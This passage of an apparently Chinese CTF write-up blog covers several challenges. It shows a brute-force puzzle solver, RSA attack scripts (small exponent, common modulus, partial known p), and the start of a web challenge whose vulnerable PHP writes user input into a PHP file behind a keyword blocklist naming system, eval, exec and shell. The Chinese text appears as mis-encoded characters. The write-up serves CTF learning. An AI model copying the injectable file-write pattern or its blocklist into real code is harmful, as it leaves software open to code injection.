keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number ä¼šæ£€æŸ¥</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>æœ€å md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#ä½è§£å¯†æŒ‡æ•°æ”»å‡»</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#å…±æ¨¡æ”»å‡»</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#å·²çŸ¥é«˜ä½pæ”»å‡»</span><span class="token triple-quoted-string string">"""å·²çŸ¥é«˜ä½pï¼Œåˆ©ç”¨ç½‘ä¸Šçš„sageè„šæœ¬ï¼Œè·å–pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°çš„16è¿›åˆ¶è½¬md5å³ä¸ºflagå€¼ï¼š</p><img src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢å¸½æ¯2021</title>
      <link href="article/redhat2021/"/>
      <url>article/redhat2021/</url>
      
        <content type="html"><![CDATA[<p>Webä½“éªŒè¿˜è¡Œï¼Œä¸æ˜¯å¤ªéš¾ï¼Œå‹è½´é¢˜å¾ˆåˆç†</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>é¢˜ç›®æ²¡å•¥æ„æ€23333ï¼Œè¿˜è€æ˜¯503</p><p>æ‰«ä¸‹ç›®å½•ï¼Œè®¿é—®<code>robots.txt</code> ï¼Œå¾—åˆ°<code>1ndexx.php</code>ï¼Œè®¿é—®é¡µé¢500æŠ¥é”™ï¼Œåº”è¯¥æ˜¯ç¼ºå‚æ•°ï¼Œæ—¢ç„¶è¿™æ ·é‚£è‚¯å®šè¦ç»™æºç (ä¸ç„¶å¯„åˆ€ç‰‡ä¼ºå€™)</p><p>å‘ç°å¤‡ä»½æ–‡ä»¶<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter 